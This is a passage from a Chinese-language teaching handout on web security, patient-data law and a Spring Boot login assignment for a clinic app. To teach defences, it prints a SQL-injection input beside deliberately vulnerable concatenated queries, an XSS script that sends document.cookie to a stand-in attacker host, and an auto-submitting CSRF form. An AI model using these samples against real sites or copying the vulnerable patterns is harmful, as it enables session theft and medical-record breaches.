	<a th:href="@{/stats}">統計資訊</a>
	<a th:href="@{/login}">醫師登入</a>  
</nav>
```
---

## 10. Web 安全三大威脅

這是本週**最核心、最重要**的段落。身為未來可能開發醫療系統的工程師，你必須認識這些威脅。

### 10.1 SQL Injection（SQL 注入攻擊）

#### 什麼是 SQL Injection？

假設有個登入程式，**錯誤地**把使用者輸入直接拼進 SQL：

```java
// 錯誤的做法 ——絕對不要這樣寫
String sql = "SELECT * FROM doctor WHERE doctor_id = '" + inputId
           + "' AND password = '" + inputPwd + "'";
```

攻擊者在 `inputId` 輸入：

```
D001' OR '1'='1
```

拼接後的 SQL 變成：

```sql
SELECT * FROM doctor WHERE doctor_id = 'D001' OR '1'='1' AND password = 'xxx'
```

`'1'='1'` 永遠為真，**整張醫師表都被選出來**，攻擊者不需要密碼就能登入。

#### 醫療情境的危險性

想像一個真實的醫療系統：

- 攻擊者用 SQL Injection 繞過登入 → 進入後台
- 下載所有病患的病歷（姓名、身分證、診斷、用藥紀錄）
- 可能造成**數萬人的個資外洩、遭求償數千萬**

台灣曾有多家醫院因類似漏洞發生事件，**這不是理論**。

#### 防範方法：使用 PreparedStatement

JPA 和 Spring Data JPA **預設就是 PreparedStatement**，你寫的程式自然就安全：

```java
// Spring Data JPA 自動使用 PreparedStatement
Optional<Doctor> doc = doctorRepo.findById(inputId);
// 實際執行的 SQL 是：
// SELECT * FROM doctor WHERE doctor_id = ?
// 參數是 inputId，不會被當成 SQL 的一部分
```

PreparedStatement 的原理：**把查詢語句和參數分開傳送**，資料庫不會把參數當成 SQL 解析。

#### 什麼時候會寫出不安全的程式？

**你自己手動拼 SQL 的時候**：

```java
// ❌ 危險！手動拼接
@Query(value = "SELECT * FROM doctor WHERE name LIKE '%" + #{#name} + "%'",
       nativeQuery = true)
```

```java
// ✓ 安全：使用參數化查詢
@Query("SELECT d FROM Doctor d WHERE d.name LIKE %:name%")
List<Doctor> searchByName(@Param("name") String name);
```

#### AI 生成程式碼的隱憂

現代學生常用 AI 寫程式，AI **很可能生成看似可用、但含 SQL Injection 的程式碼**。你必須：

- 看得懂生成的 SQL 是否使用參數化查詢
- 知道 `+` 拼接字串進 SQL 是地雷
- 對「AI 給我的程式碼」保持批判性審查

### 10.2 XSS（跨站腳本攻擊）

#### 什麼是 XSS？

攻擊者在可以輸入文字的地方（例如病患姓名）填入**惡意的 JavaScript**：

```html
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

如果網頁**直接把使用者輸入顯示出來**，這段 JS 就會在每個訪客的瀏覽器執行，**把他們的 Session Cookie 送到攻擊者的伺服器**。

攻擊者拿到 Cookie 就能**冒充你的身份**。

#### 醫療情境的危險性

- 攻擊者在病患姓名欄位植入 XSS
- 醫師登入後查看該病患的掛號 → XSS 執行
- **攻擊者獲得醫師的 Session**，可以查看、修改所有病歷

#### 防範方法：自動轉義（Escape）

**好消息**：Thymeleaf **預設就會自動轉義**所有輸出。

```html
<span th:text="${patient.name}"></span>
```

如果 `patient.name` 是 `<script>alert(1)</script>`，Thymeleaf 會渲染成：

```html
<span>&lt;script&gt;alert(1)&lt;/script&gt;</span>
```

瀏覽器看到的是**純文字**，不會執行。

#### 什麼時候會有風險？

**使用 `th:utext`（unescaped text）時**：

```html
<!-- ❌ 危險！會原封不動輸出 HTML -->
<span th:utext="${patient.name}"></span>
```

除非你非常確定內容是安全的，**永遠用 `th:text`，不要用 `th:utext`**。

### 10.3 CSRF（跨站請求偽造）

#### 什麼是 CSRF？

假設醫師 D001 已經登入 MiniClinic，瀏覽器裡有 Session Cookie。

攻擊者設計一個看似正常的網站，裡面偷偷放了：

```html
<form action="https://miniclinic.example.com/api/doctors/D001" method="post">
    <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit();</script>
```

醫師不小心點進這個網站 → 表單自動提交 → **因為瀏覽器自動帶上 MiniClinic 的 Cookie**，伺服器以為是醫師本人發的請求 → 醫師 D001 的資料被刪除。

#### 防範方法：CSRF Token

伺服器產生一個隨機 Token，放在表單裡。攻擊者無法從外部網站取得這個 Token，攻擊就失效。

Spring Security 預設有 CSRF 保護。本課程手寫版沒有啟用，**正式部署前必須處理**。

#### 課堂上的簡易對策

本週我們只使用以下簡易對策（不完整，但能擋掉一些最基本的 CSRF）：

- 修改資料只用 `POST`、`PUT`、`DELETE`，不用 `GET`
- Session Cookie 設定 `SameSite=Lax`（Spring Boot 預設已是）

---

## 11. 醫療資料保護：倫理與法規

### 11.1 台灣《個人資料保護法》

根據個資法，**病歷屬於「特種個資」**，受到最高等級保護：

- 非必要不得蒐集
- 蒐集需明確告知用途
- 必須採用**適當的安全措施**
- 外洩需 72 小時內通報
- 違法最高可處**新台幣 5000 萬元罰鍰**與**五年以下有期徒刑**

### 11.2 資料最小化原則

只蒐集、只儲存、只傳輸**必要的資料**。

**壞做法**：

```java
// ❌ 前端不需要病患的生日、電話、身份證字號，卻通通回傳了
@GetMapping("/api/patients/{chartNo}")
public Patient getPatient(@PathVariable String chartNo) {
    return patientRepo.findById(chartNo).get();  // 回傳所有欄位
}
```

**好做法：使用 DTO（Data Transfer Object）**：

```java
public class PatientSummaryDTO {
    private String chartNo;
    private String name;
    // 只有這兩個欄位
}

@GetMapping("/api/patients/{chartNo}/summary")
public PatientSummaryDTO getSummary(@PathVariable String chartNo) {
    Patient p = patientRepo.findById(chartNo).orElseThrow();
    return new PatientSummaryDTO(p.getChartNo(), p.getName());
}
```

### 11.3 認證資訊不得出現在以下位置

- **URL**：`/login?password=secret123` ❌（會留在 server log、瀏覽器歷史）
- **Log 檔**：`System.out.println("User logged in with password: " + pwd)` ❌
- **錯誤訊息**：`"Query failed: ... WHERE password='...'"` ❌

一旦認證資訊進了 log 或 URL，基本上就**永遠無法完全清除**。

### 11.4 醫療 AI 時代的新挑戰

身為醫資學程的學生，你未來可能會開發：

- 醫療影像分析系統
- 臨床決策輔助
- 電子病歷（EHR）

這些場景下，**AI 模型訓練用的資料、模型推論時碰到的資料、模型輸出的結果**都可能是受保護的醫療資料。

原則：

- **去識別化（De-identification）**：訓練前移除身分資訊
- **差分隱私（Differential Privacy）**：統計結果不暴露個人
- **審計軌跡（Audit Trail）**：誰、什麼時候、存取了什麼資料都要留紀錄

這些是本課程的**開始**，不是結束。

### 11.5 給未來工程師的三個原則

1. **資料越少越好**：能不存就不存，能不傳就不傳
2. **對 AI 生成的程式碼保持懷疑**：AI 產出「能動」的程式，但不保證「安全」
3. **被駭不是能力問題，是時間問題**：所以安全設計要假設自己會被駭

---

## 12. 作業四：登入、驗證與安全

### 作業說明

本週延續 Ch09-C 的專案。

### Part A：基本要求（必做）

- [ ] `Doctor` Entity 加入 `passwordHash` 欄位
- [ ] `data.sql` 為所有醫師填入 BCrypt 雜湊後的預設密碼（例如 `pass1234`）
- [ ] 實作 `GET /login` 顯示登入頁、`POST /login` 處理登入
- [ ] 實作 `POST /logout` 清除 Session 並重導
- [ ] 實作 `GET /dashboard`：顯示登入醫師的當日掛號
- [ ] 實作 `PUT /api/appointments/{id}/status`：允許醫師修改**自己的**掛號狀態
- [ ] 建立 `LoginRequiredInterceptor`，保護 `/dashboard` 和敏感 API
- [ ] 未登入存取 `/api/*` 受保護端點，回 `401`；頁面則重導到 `/login`
- [ ] 醫師 D001 試圖改 D002 的掛號，回 `403`
- [ ] `LoginForm` 使用 `@NotBlank` 與 `@Pattern` 驗證
- [ ] `AppointmentForm` 加上病歷號格式驗證 `TEST\d{5}`

### Part B：進階要求（必做）

**掛號取消功能**：

- [ ] 在 Dashboard 的掛號列表，為每筆 `BOOKED` 狀態的掛號加上「取消」按鈕
- [ ] 點選按鈕後，透過 JavaScript fetch 呼叫 `PUT /api/appointments/{id}/status`
- [ ] 成功後重新整理頁面，狀態改為 `CANCELLED`

**修改密碼功能**：

- [ ] 實作 `GET /password`：顯示修改密碼表單（需登入）
- [ ] 實作 `POST /password`：處理修改
- [ ] 表單需包含：舊密碼、新密碼、新密碼確認
- [ ] 驗證：舊密碼正確、新密碼與確認一致、新密碼至少 8 碼
- [ ] 成功後將密碼雜湊後更新到資料庫

### 繳交方式

- 壓縮整個 `miniclinic` 專案為 zip
- 檔名：`學號_姓名_Ch09D.zip`
- 刪除 `target/` 與 `miniclinic.db`
- 上傳至教學平台

### 評分重點

1. 登入流程正常運作，密碼以 BCrypt 雜湊儲存
2. 401 vs 403 的狀態碼正確
3. 只能操作自己的掛號（跨醫師越權會被擋）
4. 表單驗證錯誤訊息正確顯示
5. commit message 符合規範（持續從 Ch09-A 開始累積）

---

## 13. 常見問題排查

### Q1：登入成功但 dashboard 馬上又被 Interceptor 擋回 /login

**可能原因**：`session.getAttribute("loggedInDoctorId")` 的 key 拼錯。

**排查**：確認存入和讀取時用的 key 是**完全一致**的字串（大小寫、錯字）。

### Q2：BCrypt 每次雜湊同一個密碼，結果都不一樣

**這是正常的**。BCrypt 會自動加 salt，每次產生不同雜湊。驗證要用 `BCrypt.checkpw(plain, hash)`，不是直接比對字串。

### Q3：Interceptor 設定後，連 CSS 都被擋

**原因**：Interceptor 套用到了靜態資源路徑。

**解法**：
```java
.addPathPatterns("/dashboard", "/dashboard/**", ...)  // 明確列出需要保護的路徑
```
不要用 `.addPathPatterns("/**")` 這種寬鬆的設定。

### Q4：表單驗證錯誤訊息沒顯示

**排查**：
1. `@Valid` 有加在 `@ModelAttribute` 前面嗎？
2. `BindingResult` 參數有緊接在 `@ModelAttribute` 參數之後嗎？
3. Thymeleaf 模板的 `th:errors` 路徑對嗎？（`*{doctorId}` 而不是 `${doctorId}`）

### Q5：修改掛號狀態的 API，PUT 請求找不到路由

**常見原因**：REST Client 的 `Content-Type` 沒寫 `application/json`。

```
PUT http://localhost:8080/api/appointments/1/status
Content-Type: application/json    ← 這行不能少

{"status": "COMPLETED"}
```

### Q6：data.sql 的 BCrypt 雜湊值怎麼產生？

寫一個一次性的 main 方法：

```java
public static void main(String[] args) {
    System.out.println(BCrypt.hashpw("pass1234", BCrypt.gensalt()));
}
```

執行後把輸出複製到 `data.sql` 即可。

---

## 延伸閱讀（非必讀）

### 14. Spring Security 簡介

業界實際開發不會手寫登入流程，會用 Spring Security：

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/login", "/css/**").permitAll()
                .anyRequest().authenticated())
            .formLogin(form -> form.loginPage("/login"))
            .csrf(csrf -> csrf.ignoringRequestMatchers("/api/**"));
        return http.build();
    }
}
```

- 自動 CSRF 保護
- 自動 Session 管理
- 自動密碼編碼器整合
- 支援 OAuth、JWT、LDAP 等

你學過本週的手寫版本之後，看 Spring Security 會清楚很多——它做的事情你已經理解。

### 15. JWT：另一種選擇

**JSON Web Token（JWT）**是另一種認證方式，特別適合前後端分離的 SPA：

- 伺服器產生一個**帶簽章的 token**給客戶端
- 客戶端每次請求都帶上 token
- 伺服器驗證簽章即可，**不用查 Session**

優點：伺服器不用存 session，適合分散式系統。

缺點：token 發出後難以提前作廢（沒有 `invalidate()`）。

### 16. RBAC 與 ABAC

當系統變複雜，會需要不同的存取控制模型：

- **RBAC（Role-Based Access Control）**：以角色劃分權限。例如「醫師」、「護理師」、「管理員」
- **ABAC（Attribute-Based Access Control）**：根據屬性決定。例如「只有這位病患的主治醫師才能看完整病歷」

MiniClinic 的需求用簡單的「只能操作自己的資料」就夠，但真實醫療系統常用 ABAC。

### 17. 審計軌跡（Audit Trail）

在醫療系統中，「**誰、在什麼時候、存取了什麼資料**」都必須留紀錄：

```java
@Entity
public class AuditLog {
    @Id @GeneratedValue private Long id;
    private String doctorId;      // 誰
    private LocalDateTime time;   // 什麼時候
    private String action;        // 做了什麼
    private String resource;      // 存取什麼
    private String ipAddress;     // 從哪裡
}
```

Spring AOP 可以自動攔截所有方法呼叫，寫 Audit Log。這是醫療、金融系統的標配。

---

## 下週預告：Ch09-E 將學到

- Git 基本操作（`add`、`commit`、`push`、`pull`）
- `.gitignore` 正確設定（不把 DB 密碼推上去）
- README 撰寫規範與範例
- **Commit message 規範完整說明**（AI 使用紀錄的格式）
- Spring Profiles（dev / prod 多環境配置）
- SQLite vs PostgreSQL 差異對照
- Render 雲端部署完整流程
- 本機 SQLite、雲端 PostgreSQL 的雙軌運作
- CI/CD 快速回顧

下週是**期末專案整合週**。我們會把前四週的成果一起部署到雲端，讓 MiniClinic 可以被全世界訪問。

---

*本講義由教師自行編寫，所有程式碼範例均為原創，供課堂教學使用。*
